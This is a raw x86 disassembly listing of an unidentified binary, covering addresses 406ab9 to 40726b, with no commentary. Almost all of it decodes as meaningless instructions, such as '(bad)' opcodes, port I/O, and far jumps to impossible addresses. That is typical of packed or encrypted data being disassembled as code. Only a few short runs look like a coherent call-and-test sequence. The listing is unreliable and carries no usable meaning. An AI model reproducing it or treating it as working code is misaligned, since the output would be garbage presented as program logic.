  406ab9:	not    esp
  406abb:	and    dl,BYTE PTR [eax]
  406abd:	test   BYTE PTR [edi],0xd1
  406ac0:	sub    al,0xe7
  406ac2:	pop    ds
  406ac3:	jmp    0x406afb
  406ac5:	mov    cl,0x8
  406ac7:	inc    esi
  406ac8:	test   ch,dl
  406aca:	loope  0x406b05
  406acc:	(bad)
  406acf:	xchg   ebx,eax
  406ad0:	cmc    
  406ad1:	daa    
  406ad2:	push   esp
  406ad3:	and    DWORD PTR [esi-0x3b],0xe1f5ecff
  406ada:	mov    bh,BYTE PTR [edi+0x6497562d]
  406ae0:	loopne 0x406ad7
  406ae2:	xor    esi,DWORD PTR [esi+eax*2-0x20]
  406ae6:	push   edi
  406ae7:	fisub  WORD PTR [edx]
  406ae9:	sub    BYTE PTR [eax],dh
  406aeb:	daa    
  406aec:	mov    gs,ebx
  406aee:	or     DWORD PTR [eax],eax
  406af0:	push   esi
  406af1:	cdq    
  406af2:	mov    es,WORD PTR [edi]
  406af4:	fsubr  QWORD PTR [edi+0x8]
  406af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406af8:	and    al,0x1d
  406afa:	push   eax
  406afb:	jo     0x406b0d
  406afd:	add    BYTE PTR ds:0x74e141f3,0x58
  406b04:	or     BYTE PTR [edi],ch
  406b06:	mov    ebp,0xfce60637
  406b0b:	dec    edx
  406b0c:	inc    edi
  406b0d:	cmpxchg8b QWORD PTR [edx-0x51a62d16]
  406b14:	es jmp 0xdd1d5b1d
  406b1a:	or     al,BYTE PTR [edi+0x65]
  406b1d:	adc    bh,BYTE PTR [esi-0x48]
  406b20:	(bad)  
  406b21:	aaa    
  406b22:	gs (bad) 
  406b24:	jp     0x406af9
  406b26:	fild   WORD PTR [esp+esi*8-0x37]
  406b2a:	jmp    0x6998:0xac7f2bf0
  406b31:	sar    DWORD PTR [ecx-0x6d8006b1],0x9f
  406b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b39:	or     al,0x70
  406b3b:	ins    DWORD PTR es:[edi],dx
  406b3c:	pop    esi
  406b3d:	mov    ebx,edi
  406b3f:	out    0xdd,eax
  406b41:	mov    bl,0xe8
  406b43:	add    esi,DWORD PTR [ecx]
  406b45:	test   ebp,0x37cdfdf2
  406b4b:	ret    
  406b4c:	mov    ecx,0x43ecb2fb
  406b51:	mov    BYTE PTR [ebp+0xb],bl
  406b54:	mov    bl,0xbb
  406b56:	enter  0x22a,0xa3
  406b5a:	outs   dx,BYTE PTR ds:[esi]
  406b5b:	xchg   DWORD PTR [ebx-0x25],ebx
  406b5e:	inc    edx
  406b5f:	push   edx
  406b60:	push   ecx
  406b61:	cld    
  406b62:	jns    0x68040d97
  406b68:	jne    0x406bac
  406b6a:	or     eax,0xfcdda8e8
  406b6f:	adc    bl,BYTE PTR [esi+0x62]
  406b72:	ror    eax,0x4
  406b75:	pusha  
  406b76:	out    dx,eax
  406b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b78:	pop    ebx
  406b79:	pop    esi
  406b7a:	call   0x8c1b:0x5a876486
  406b81:	dec    ebx
  406b83:	inc    edx
  406b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b85:	xor    ch,BYTE PTR [edx-0x53]
  406b88:	stos   BYTE PTR es:[edi],al
  406b89:	adc    ebp,ebp
  406b8b:	test   eax,0x1fff070d
  406b90:	popa   
  406b91:	mov    edx,0xb3c5e5f3
  406b96:	ret    0x5a7b
  406b99:	ins    DWORD PTR es:[edi],dx
  406b9a:	mov    ch,BYTE PTR [edi+0x28bb8737]
  406ba0:	push   0x72
  406ba2:	inc    eax
  406ba3:	hlt    
  406ba4:	inc    ebx
  406ba5:	or     ah,BYTE PTR [ecx-0x5cef0b5c]
  406bab:	jne    0x406bfe
  406bad:	adc    DWORD PTR [edx-0x15],eax
  406bb0:	jbe    0x406bf7
  406bb2:	jg     0x406b7c
  406bb4:	(bad)  
  406bb5:	cs (bad) 
  406bb7:	cmp    eax,0x7a08023b
  406bbc:	inc    edi
  406bbd:	cmp    BYTE PTR [ebp+0x20],cl
  406bc0:	out    dx,eax
  406bc1:	js     0x406c2e
  406bc3:	lea    eax,[edx]
  406bc5:	xchg   ebx,eax
  406bc6:	jge    0x406b98
  406bc8:	dec    ebp
  406bc9:	mov    edi,esp
  406bcb:	repnz xor al,0x6f
  406bce:	imul   ecx,DWORD PTR [ebp+0x41],0xe12204c7
  406bd5:	out    0x28,eax
  406bd7:	xlat   BYTE PTR gs:[ebx]
  406bd9:	or     ebx,ecx
  406bdb:	push   eax
  406bdc:	loopne 0x406c2e
  406bde:	pop    ebp
  406bdf:	nop
  406be0:	ficomp DWORD PTR [esi-0x3b]
  406be3:	sub    ebp,DWORD PTR [esi+edx*2-0x31]
  406be7:	(bad)  
  406be8:	out    0x1b,eax
  406bea:	pop    ebx
  406beb:	in     eax,0x5a
  406bed:	add    DWORD PTR [ebx+ecx*1+0x5e],esi
  406bf1:	sbb    DWORD PTR [ecx],0x27
  406bf4:	dec    edi
  406bf5:	jge    0x406c25
  406bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bf8:	and    eax,0xf1e41186
  406bfd:	jo     0x406c52
  406bff:	pop    esi
  406c00:	jae    0x406c5e
  406c02:	call   0x8fb8:0x77b37159
  406c09:	imul   BYTE PTR [eax-0xa6faa15]
  406c0f:	push   0xa1a11f6e
  406c14:	sbb    BYTE PTR [esi-0x4d],dh
  406c17:	hlt    
  406c18:	jns    0x406c6a
  406c1a:	xchg   ebx,eax
  406c1b:	ins    DWORD PTR es:[edi],dx
  406c1c:	mov    esp,0x212c6766
  406c21:	pop    esi
  406c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c23:	jle    0x406be8
  406c25:	xor    dl,BYTE PTR [ecx]
  406c27:	mov    ch,0x3a
  406c2a:	mov    ebp,0x7ba99aa6
  406c2f:	lahf   
  406c30:	loop   0x406c10
  406c32:	mov    ch,0x27
  406c34:	and    eax,0x2dcdc9d9
  406c39:	push   0x7
  406c3b:	xor    al,0xe5
  406c3d:	mov    esp,0x6132ddba
  406c42:	retf   
  406c43:	add    BYTE PTR [eax-0x22907b6c],al
  406c49:	push   ecx
  406c4a:	cmp    al,0x14
  406c4c:	xchg   DWORD PTR [edi+ebp*4-0x37],eax
  406c50:	outs   dx,DWORD PTR ds:[esi]
  406c51:	mov    ebx,0xae42c7f5
  406c56:	cmp    ch,BYTE PTR [ecx+0x5beee7d6]
  406c5c:	stos   BYTE PTR es:[edi],al
  406c5d:	hlt    
  406c5e:	or     esi,DWORD PTR [ebp+0x15]
  406c61:	jne    0x406c7d
  406c63:	fisttp DWORD PTR [edx]
  406c65:	bound  edi,QWORD PTR [ebp-0x5e]
  406c68:	iret   
  406c69:	repz xor ecx,DWORD PTR [edx+0x39a0737]
  406c70:	add    al,0xe6
  406c72:	in     al,0x7e
  406c74:	loop   0x406caf
  406c76:	int3   
  406c77:	sbb    al,0x1f
  406c79:	imul   edi,DWORD PTR [edi+0x56],0x4861ea1b
  406c80:	xchg   edx,ecx
  406c82:	sbb    al,0x79
  406c84:	lods   eax,DWORD PTR ds:[esi]
  406c85:	test   esi,0x25f1c0e7
  406c8b:	sbb    eax,0x15cd5b80
  406c90:	ror    BYTE PTR [ebp-0x24],cl
  406c93:	sbb    al,0x86
  406c95:	rol    DWORD PTR [ebp+0x55],cl
  406c98:	mov    eax,0xe020806b
  406c9d:	xchg   edi,eax
  406c9e:	sub    esi,DWORD PTR ds:0xfb536bc8
  406ca4:	lea    esp,[esi+ecx*1]
  406ca7:	mov    ebp,0x21b0c331
  406cac:	push   ebx
  406cae:	mov    esp,DWORD PTR [esi-0x57]
  406cb1:	imul   eax,DWORD PTR [edi+edx*1],0x51
  406cb5:	add    DWORD PTR [edx+0x49746b56],ebx
  406cbb:	cmp    ch,BYTE PTR [esi]
  406cbd:	mov    bl,0xde
  406cbf:	inc    edx
  406cc0:	xchg   edi,eax
  406cc1:	sbb    ebx,ebx
  406cc3:	in     al,0xce
  406cc5:	sbb    al,0xca
  406cc7:	jle    0x406cb0
  406cc9:	shl    edi,0xff
  406ccc:	jne    0x406cc2
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0xa24cd985
  406cf4:	jae    0x406d02
  406cf6:	retf   
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406d0f
  406cff:	ret    0x9beb
  406d02:	imul   esp,DWORD PTR [edi],0xffffff8a
  406d05:	jae    0x406d2d
  406d07:	imul   ebx,DWORD PTR [edx],0x798b8a16
  406d0d:	inc    esp
  406d0e:	cmp    BYTE PTR [esi-0x3],bh
  406d11:	or     DWORD PTR [eax+eax*1-0x543a52b2],ebx
  406d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d19:	pop    es
  406d1a:	push   es
  406d1b:	mov    ebp,DWORD PTR [esi]
  406d1d:	leave  
  406d1e:	mov    al,ds:0x17e6b512
  406d23:	pop    ecx
  406d24:	mov    dh,0x34
  406d26:	adc    al,0xb8
  406d28:	push   ecx
  406d29:	int    0x45
  406d2b:	pushf  
  406d2c:	popa   
  406d2d:	or     esi,DWORD PTR [edi]
  406d2f:	xchg   BYTE PTR [edx-0x59e01f94],dl
  406d35:	repz pop ecx
  406d37:	data16 test BYTE PTR [ebp+0x6774b887],ah
  406d3e:	fs inc esp
  406d40:	xchg   edi,eax
  406d41:	fs mov edx,0xa7971e94
  406d47:	fldenv [edi-0x55c7636b]
  406d4d:	push   ecx
  406d4e:	xor    eax,0x642256c
  406d53:	outs   dx,DWORD PTR ds:[esi]
  406d54:	lods   al,BYTE PTR ds:[esi]
  406d55:	pop    edi
  406d56:	enter  0xe09,0x66
  406d5a:	push   cs
  406d5b:	out    dx,eax
  406d5c:	xchg   BYTE PTR [ecx+edx*4],dl
  406d5f:	xor    eax,0x74cdb5db
  406d64:	js     0x406db1
  406d66:	loope  0x406d90
  406d68:	xor    edi,DWORD PTR [esi+0x48]
  406d6b:	inc    ecx
  406d6c:	fs std 
  406d6e:	pop    edx
  406d6f:	mov    al,ds:0xefc58bda
  406d74:	mov    dl,0x34
  406d76:	pop    eax
  406d77:	aad    0xdb
  406d79:	dec    esp
  406d7a:	jle    0x406db2
  406d7c:	inc    ebp
  406d7d:	mov    bl,0xa9
  406d7f:	xor    DWORD PTR [eax+0x1249161c],0xffffffb9
  406d86:	or     ecx,DWORD PTR [ebp-0x6c30d6e6]
  406d8c:	mov    ch,0x83
  406d8e:	add    al,0x16
  406d90:	or     eax,0x640c4095
  406d95:	enter  0xa363,0x80
  406d99:	ret    
  406d9a:	pop    edx
  406d9b:	and    BYTE PTR [edx-0x12],dh
  406d9e:	inc    ebx
  406d9f:	dec    esi
  406da0:	ds push es
  406da2:	cmp    al,0x5b
  406da4:	into   
  406da5:	cmovle eax,DWORD PTR [edx+ebp*8+0x481640f2]
  406dad:	fs sbb eax,esp
  406db0:	push   ecx
  406db1:	push   edi
  406db2:	sub    DWORD PTR [esi-0x27],0x551636d6
  406db9:	imul   edi,DWORD PTR [ebx+ebx*8],0xc919aff3
  406dc0:	jl     0x406d6b
  406dc2:	les    edi,FWORD PTR [ecx-0x2c]
  406dc5:	sbb    ah,ch
  406dc7:	stc    
  406dc8:	sub    eax,0x77db22b7
  406dcd:	inc    eax
  406dce:	lahf   
  406dcf:	jmp    0x406dfc
  406dd1:	cmp    edi,0x87cc1ce0
  406dd7:	test   BYTE PTR [eax+0x7a],dl
  406dda:	xchg   bh,dl
  406ddc:	xchg   ebp,eax
  406ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406dde:	pop    es
  406ddf:	daa    
  406de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406de1:	xor    eax,0xa7c287f1
  406de6:	repz and bh,BYTE PTR [ebp-0x2]
  406dea:	popa   
  406deb:	xchg   ebx,eax
  406dec:	push   ss
  406ded:	mov    ds:0x34e26b7e,eax
  406df2:	push   eax
  406df3:	mov    ah,0x6c
  406df5:	retf   
  406df6:	shl    ah,0xce
  406df9:	fsub   st,st(3)
  406dfc:	nop
  406dfd:	inc    edi
  406dfe:	sub    bl,BYTE PTR [esi+eax*1]
  406e01:	in     eax,0x74
  406e03:	inc    esi
  406e04:	cmp    dh,ch
  406e06:	jecxz  0x406e17
  406e08:	xchg   esi,eax
  406e09:	add    DWORD PTR [edi+esi*2],esp
  406e0c:	inc    edi
  406e0d:	jmp    0xe41fc1f4
  406e12:	in     eax,0x19
  406e14:	mov    ebp,DWORD PTR ds:0xd0247d51
  406e1a:	idiv   BYTE PTR [eax+0x69]
  406e1d:	je     0x406dfd
  406e1f:	sbb    DWORD PTR [ebx+0x3c],esp
  406e22:	das    
  406e23:	aad    0xdb
  406e25:	mov    ebp,0x778a9559
  406e2a:	and    DWORD PTR [edx],edi
  406e2c:	cli    
  406e2d:	xor    eax,DWORD PTR [ebp+0x5a]
  406e30:	add    eax,0x33c29ba6
  406e35:	pop    es
  406e36:	inc    ebx
  406e37:	aas    
  406e38:	cmp    cl,BYTE PTR [ecx]
  406e3a:	data16 jns 0x406dc6
  406e3d:	adc    DWORD PTR [eax],esp
  406e3f:	pushf  
  406e40:	out    0x65,eax
  406e42:	in     eax,0x79
  406e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e45:	sar    BYTE PTR [eax+eiz*1],cl
  406e48:	(bad)  
  406e49:	in     eax,0x33
  406e4b:	push   ds
  406e4c:	pop    ecx
  406e4d:	cmc    
  406e4e:	pop    ecx
  406e4f:	sbb    ebx,DWORD PTR [eax]
  406e51:	sbb    dh,BYTE PTR ds:0x2da0890b
  406e57:	loopne 0x406e5e
  406e59:	std    
  406e5a:	sar    ebp,0x5e
  406e5d:	add    al,0x79
  406e5f:	out    dx,eax
  406e60:	jno    0x406eb5
  406e62:	xchg   ebp,eax
  406e63:	cld    
  406e64:	scas   al,BYTE PTR es:[edi]
  406e65:	in     al,dx
  406e66:	adc    DWORD PTR [edx+0x76],edi
  406e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e6a:	lds    eax,FWORD PTR [edi-0x5a]
  406e6d:	loop   0x406e90
  406e6f:	cmp    cl,cl
  406e71:	(bad)  
  406e72:	arpl   sp,ax
  406e74:	into   
  406e75:	adc    BYTE PTR [edx+0x15],cl
  406e78:	mov    ds:0xf25278ef,al
  406e7d:	cld    
  406e7e:	pop    edi
  406e7f:	daa    
  406e80:	adc    esi,DWORD PTR [esi+0x25586498]
  406e86:	jo     0x406e23
  406e88:	call   0xeecc32b8
  406e8d:	(bad)  
  406e8e:	add    BYTE PTR [ebx-0x22],ch
  406e91:	in     eax,0xd9
  406e93:	gs xchg ebx,eax
  406e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e96:	lea    ecx,[edi-0x27a40f38]
  406e9c:	mov    ds:0x92d72114,al
  406ea1:	in     al,0x42
  406ea3:	(bad)  
  406ea4:	mov    dh,0xe4
  406ea6:	test   al,0xbe
  406ea8:	shl    esi,cl
  406eaa:	sbb    DWORD PTR [esi-0x40],edi
  406ead:	test   al,0x34
  406eaf:	adc    BYTE PTR [edx+0x2e],bh
  406eb2:	push   ebp
  406eb3:	loope  0x406ee3
  406eb5:	xlat   BYTE PTR ds:[ebx]
  406eb6:	inc    eax
  406eb7:	and    ch,cl
  406eb9:	sti    
  406eba:	int    0x73
  406ebc:	cmp    BYTE PTR [edx-0xf1ba642],dl
  406ec2:	(bad)
  406ec5:	lods   eax,DWORD PTR ds:[esi]
  406ec6:	pop    ebx
  406ec7:	sub    DWORD PTR [ebx-0x798281f2],eax
  406ecd:	call   0x1b2a98fb
  406ed2:	pop    ecx
  406ed3:	sub    esi,DWORD PTR [esi-0x13]
  406ed6:	enter  0xac44,0x37
  406eda:	mov    ebx,0x5a8b6e4e
  406edf:	retf   
  406ee0:	in     al,0xca
  406ee2:	dec    ebx
  406ee3:	xor    al,0x53
  406ee5:	fdivrp st(3),st
  406ee7:	mov    eax,ds:0x608e1494
  406eec:	lock stc 
  406eee:	adc    DWORD PTR [edi],edi
  406ef0:	cwde   
  406ef1:	dec    edx
  406ef2:	leave  
  406ef3:	sub    BYTE PTR [ebx],dl
  406ef5:	int3   
  406ef6:	push   ecx
  406ef7:	mov    bh,0x7e
  406ef9:	sbb    DWORD PTR [ebp+0x5f],0xa875e8dc
  406f00:	and    dh,ah
  406f02:	push   esi
  406f03:	inc    esp
  406f04:	enter  0x72f6,0x65
  406f08:	jo     0x406f61
  406f0a:	pop    ss
  406f0b:	mov    ecx,0x9c0b58c7
  406f10:	jg     0x406f75
  406f12:	bound  esp,QWORD PTR [eax+0x784f447c]
  406f18:	dec    DWORD PTR [ebx+eiz*8]
  406f1b:	pop    edi
  406f1c:	cmp    bh,BYTE PTR [esi+0x2d494a87]
  406f22:	mov    ss:0x254a649d,eax
  406f28:	adc    ah,0xd2
  406f2b:	mov    al,ds:0x86079d3c
  406f30:	xchg   ebp,eax
  406f31:	jne    0x406f6e
  406f33:	aam    0xc7
  406f35:	mov    eax,0xcd416b0c
  406f3a:	aam    0x15
  406f3c:	cmp    esp,DWORD PTR [edi]
  406f3e:	(bad)  
  406f3f:	ds sti 
  406f41:	sbb    DWORD PTR [ecx+0x62],edx
  406f44:	rol    edi,cl
  406f46:	ror    dl,0x49
  406f49:	cmp    DWORD PTR [edi],edi
  406f4b:	jle    0x406f96
  406f4d:	adc    esi,eax
  406f4f:	stc    
  406f50:	jle    0x406f7f
  406f52:	dec    ebp
  406f53:	or     dh,bl
  406f55:	jne    0x406eeb
  406f57:	or     cl,BYTE PTR [esi+0x1aa03f75]
  406f5d:	xor    BYTE PTR [esi+eiz*8-0x7fe4836],0xda
  406f65:	add    ah,BYTE PTR [ebx+0x74167d9a]
  406f6b:	aas    
  406f6c:	pushf  
  406f6d:	adc    WORD PTR [ebp+0x64],0xffc6
  406f72:	xor    BYTE PTR ds:0x7c71d232,ch
  406f78:	call   0xd0116374
  406f7d:	clc    
  406f7e:	jbe    0x406f18
  406f80:	jmp    0x406f4e
  406f82:	pop    es
  406f83:	(bad)  
  406f85:	rol    BYTE PTR [eax-0x40c38548],cl
  406f8b:	fcom   QWORD PTR [ecx]
  406f8d:	shl    BYTE PTR [ebp+0x7],0x14
  406f91:	mov    dh,0x32
  406f93:	mov    al,0x62
  406f95:	pop    ss
  406f96:	shr    DWORD PTR [eax+0x2ac1b850],1
  406f9c:	nop
  406f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f9e:	loopne 0x407019
  406fa0:	sahf   
  406fa1:	mov    bh,0xdb
  406fa3:	mov    ebp,0x6068f386
  406fa8:	out    0x94,al
  406faa:	dec    ebp
  406fab:	and    ah,ah
  406fad:	out    dx,eax
  406fae:	sbb    al,0xb2
  406fb0:	xor    eax,0x81bb1223
  406fb5:	dec    ecx
  406fb6:	jnp    0x406f90
  406fb8:	aaa    
  406fb9:	popa   
  406fba:	xchg   esi,eax
  406fbb:	mov    bh,0x70
  406fbd:	stos   BYTE PTR es:[edi],al
  406fbe:	push   ds
  406fbf:	adc    DWORD PTR [edx-0x7414ac31],ebp
  406fc5:	ret    0x1b7c
  406fc8:	dec    eax
  406fc9:	dec    esp
  406fca:	adc    bl,BYTE PTR [edx]
  406fcc:	jne    0x407017
  406fce:	cdq    
  406fcf:	imul   ecx,ebp,0xb4b1f45f
  406fd5:	adc    BYTE PTR [ebx+eiz*4],ah
  406fd8:	sub    DWORD PTR [eax-0x77bf20df],0xbfe3f915
  406fe2:	enter  0x416b,0xaf
  406fe6:	mov    ebp,0xc012484f
  406feb:	mov    al,ds:0x9f7d4847
  406ff0:	adc    dl,BYTE PTR [edi-0x76]
  406ff3:	ds push ds
  406ff5:	pop    edx
  406ff6:	xchg   DWORD PTR [edx+0x7941c04f],ecx
  406ffc:	je     0x407065
  406ffe:	lods   al,BYTE PTR ds:[esi]
  406fff:	sar    DWORD PTR [ebp+0x62],cl
  407002:	sub    DWORD PTR [esi+0x16],0x5e71ff0d
  407009:	jle    0x406fe8
  40700b:	mov    ds:0x4baba549,al
  407010:	mov    eax,0x28d85469
  407015:	js     0x406feb
  407017:	sub    BYTE PTR [edi-0x30],bl
  40701a:	mov    bh,0xb0
  40701c:	call   0x9e19171a
  407021:	std    
  407022:	test   esp,edx
  407024:	dec    edx
  407025:	xchg   DWORD PTR [edi-0x16cc779d],ebx
  40702b:	fst    DWORD PTR [edx+0x458b5011]
  407031:	in     al,dx
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0x9630c12c
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x4070a1
  407061:	imul   esp,DWORD PTR [ebp-0x25],0xffffffc6
  407065:	push   eax
  407066:	gs cmp ah,dl
  407069:	xchg   ebx,eax
  40706a:	aaa    
  40706b:	pavgw  mm7,QWORD PTR [ecx]
  40706e:	fnstenv [ebx+0xe302db5]
  407074:	xor    al,0xa3
  407076:	mov    ds:0x9dc302dc,al
  40707b:	jne    0x407003
  40707d:	and    al,bl
  40707f:	adc    eax,0x4655367f
  407084:	pop    es
  407085:	mov    cl,0xde
  407087:	inc    cx
  407089:	in     eax,0x69
  40708b:	and    ecx,ebx
  40708d:	int3   
  40708e:	jb     0x40706c
  407090:	lds    esp,FWORD PTR [ebx]
  407092:	pop    eax
  407093:	ja     0x40705f
  407095:	xchg   DWORD PTR [eax+0x19beac18],ecx
  40709b:	inc    edx
  40709c:	dec    edx
  40709d:	retf   0xcd1c
  4070a0:	lds    ebx,FWORD PTR [edi+0x76]
  4070a3:	dec    esp
  4070a4:	sub    cl,BYTE PTR [ebx]
  4070a6:	and    ecx,DWORD PTR [ebp+0x59354c55]
  4070ac:	sbb    al,0x94
  4070ae:	ja     0x40710b
  4070b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070b1:	ja     0x407079
  4070b3:	dec    edi
  4070b4:	shl    BYTE PTR [esi+0x13],1
  4070b7:	repnz xchg esp,eax
  4070b9:	xchg   esp,eax
  4070ba:	mov    ch,0x4c
  4070bc:	jne    0x4070af
  4070be:	fist   DWORD PTR [ebx-0x779c773e]
  4070c4:	sub    al,dl
  4070c6:	mov    edx,edi
  4070c8:	push   esp
  4070c9:	mov    cl,0xa8
  4070cb:	cmp    ebx,ecx
  4070cd:	out    0xbd,eax
  4070cf:	scas   eax,DWORD PTR es:[edi]
  4070d0:	dec    esi
  4070d1:	mov    ecx,0x19035b83
  4070d6:	mov    bh,0x8e
  4070d8:	stc    
  4070d9:	inc    edi
  4070da:	pop    edi
  4070db:	dec    ebx
  4070dc:	push   ds
  4070dd:	or     al,0xcd
  4070df:	sbb    eax,0xfed350f
  4070e4:	ins    BYTE PTR es:[edi],dx
  4070e5:	push   ebx
  4070e6:	jbe    0x407162
  4070e8:	and    BYTE PTR [eax+0x59],bl
  4070eb:	cld    
  4070ec:	icebp  
  4070ed:	int3   
  4070ee:	xchg   esp,eax
  4070ef:	add    cl,BYTE PTR [ebx-0x4]
  4070f2:	in     eax,dx
  4070f3:	xor    al,BYTE PTR [ebx]
  4070f5:	add    al,0x5
  4070f7:	les    ecx,FWORD PTR [ebp-0x1287277]
  4070fd:	cmp    DWORD PTR ds:0xa8554138,ebp
  407103:	ins    BYTE PTR es:[edi],dx
  407104:	aad    0xbd
  407106:	push   eax
  407107:	clc    
  407108:	in     al,dx
  407109:	dec    ebx
  40710a:	lods   al,BYTE PTR ds:[esi]
  40710b:	clc    
  40710c:	inc    edx
  40710d:	xchg   edx,eax
  40710e:	test   eax,0x94b3daea
  407113:	rol    DWORD PTR [edx],cl
  407115:	or     esi,DWORD PTR [ecx+0x7fd57177]
  40711b:	popa   
  40711c:	test   DWORD PTR fs:[esi+edx*2-0x7f4037a3],edi
  407124:	daa    
  407125:	cmp    esi,DWORD PTR [edi+edi*4+0x30914796]
  40712c:	adc    al,0xb1
  40712e:	(bad)  
  40712f:	in     al,0x57
  407131:	fsub   DWORD PTR [ebp-0x7f]
  407134:	ja     0x4070e3
  407136:	sub    al,bh
  407138:	retf   
  407139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40713a:	iret   
  40713b:	cmp    al,ch
  40713d:	pop    ebx
  40713e:	(bad)  
  407140:	mov    bh,0x85
  407142:	or     al,0xdc
  407144:	outs   dx,BYTE PTR ds:[esi]
  407145:	iret   
  407146:	push   es
  407147:	sbb    ebx,eax
  407149:	into   
  40714a:	xchg   edx,eax
  40714b:	xor    al,0x28
  40714d:	add    eax,0xc0b834cf
  407152:	test   DWORD PTR [ebx],ecx
  407154:	push   esi
  407155:	test   al,0xcf
  407157:	repnz sub eax,0xcef1467b
  40715d:	add    DWORD PTR [eax],ecx
  40715f:	cmp    BYTE PTR [ecx+0x619a09dc],ch
  407165:	sti    
  407166:	dec    esi
  407167:	bound  esi,QWORD PTR [ebx+0x259d9de9]
  40716d:	or     eax,DWORD PTR [esi]
  40716f:	pop    esi
  407170:	fwait
  407171:	aaa    
  407172:	fisttp QWORD PTR [edi+eax*8]
  407175:	outs   dx,DWORD PTR ds:[esi]
  407176:	mov    ds:0x8b5435a9,eax
  40717b:	pop    ebp
  40717c:	or     BYTE PTR [ebp-0x37],0xad
  407180:	sub    dh,ah
  407182:	jmp    0x40715f
  407184:	dec    esi
  407185:	fdiv   QWORD PTR [ebp+0x407a4843]
  40718b:	lods   al,BYTE PTR ds:[esi]
  40718c:	dec    edx
  40718d:	jl     0x4071a0
  40718f:	jae    0x407174
  407191:	addr16 pop eax
  407193:	adc    eax,0x3b031aff
  407198:	add    dh,BYTE PTR [eax]
  40719a:	adc    dh,BYTE PTR [ecx]
  40719c:	ins    DWORD PTR es:[edi],dx
  40719d:	out    0xfc,eax
  40719f:	jecxz  0x407210
  4071a1:	leave  
  4071a2:	mov    ebx,0x2bfe5919
  4071a7:	call   0x7f68b52a
  4071ac:	fidiv  DWORD PTR [esi]
  4071ae:	mov    ebx,0x4d0f819a
  4071b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071b4:	(bad)  
  4071b5:	or     al,0x49
  4071b7:	jecxz  0x407178
  4071b9:	dec    ecx
  4071ba:	test   BYTE PTR [edx+eiz*2],al
  4071bd:	mov    esp,0xaede808b
  4071c2:	xchg   edx,eax
  4071c3:	cli    
  4071c4:	and    al,0x59
  4071c6:	cdq    
  4071c7:	lahf   
  4071c8:	sub    DWORD PTR [ebx-0x388a901d],edx
  4071ce:	inc    esp
  4071cf:	jle    0x4071c1
  4071d1:	mov    BYTE PTR [edi],bh
  4071d3:	loop   0x40715b
  4071d5:	ins    DWORD PTR es:[edi],dx
  4071d6:	arpl   WORD PTR [ebp-0x60],sp
  4071d9:	mov    WORD PTR [ebp+0x7],es
  4071dc:	add    bh,BYTE PTR [ebx-0x126d12fe]
  4071e2:	fwait
  4071e3:	sbb    dl,BYTE PTR [edi-0x16de573c]
  4071e9:	popf   
  4071ea:	sar    BYTE PTR [ecx-0x5b],0x1
  4071ee:	and    edx,esp
  4071f0:	xlat   BYTE PTR ds:[ebx]
  4071f1:	fdivr  st,st(7)
  4071f3:	ficom  DWORD PTR [ecx+0x4875c1de]
  4071f9:	ds mov ebp,0x9a12e5bc
  4071ff:	cmp    al,0x39
  407201:	sub    al,BYTE PTR [eax]
  407203:	ret    
  407204:	adc    DWORD PTR [edi+0x7e595996],esi
  40720a:	lock mov al,ds:0xc84e73c8
  407210:	cs mov al,0x1a
  407213:	ins    BYTE PTR es:[edi],dx
  407214:	das    
  407215:	add    al,0xad
  407217:	mov    bl,0x60
  407219:	cmp    eax,0x6d7d3240
  40721e:	out    0xd4,eax
  407220:	mov    edi,0x77c62a8a
  407225:	fild   DWORD PTR [ebx-0x65]
  407228:	pop    es
  407229:	jns    0x4071e3
  40722b:	lahf   
  40722c:	and    BYTE PTR [ebx+0x11],dl
  40722f:	cmp    BYTE PTR [edx-0x30e13933],bh
  407235:	pop    edx
  407236:	or     BYTE PTR [ebp+0x4c],bl
  407239:	or     eax,0x88251fb0
  40723e:	adc    ch,ch
  407240:	pop    ebp
  407241:	mov    ds:0x9db51e9c,al
  407246:	cld    
  407247:	lds    edx,FWORD PTR [ebp-0x59]
  40724a:	test   al,0x2e
  40724c:	popf   
  40724d:	jmp    0xc6c8:0x2ddc0c36
  407254:	push   cs
  407255:	pop    es
  407256:	test   BYTE PTR [edi+0x34fd1688],cl
  40725c:	iret   
  40725d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40725e:	xor    BYTE PTR [edx-0x66],bl
  407261:	jno    0x40726f
  407263:	lahf   
  407264:	les    ecx,FWORD PTR [esp+ebx*1-0xad5bbbf]
  40726b:	sbb    al,0x19
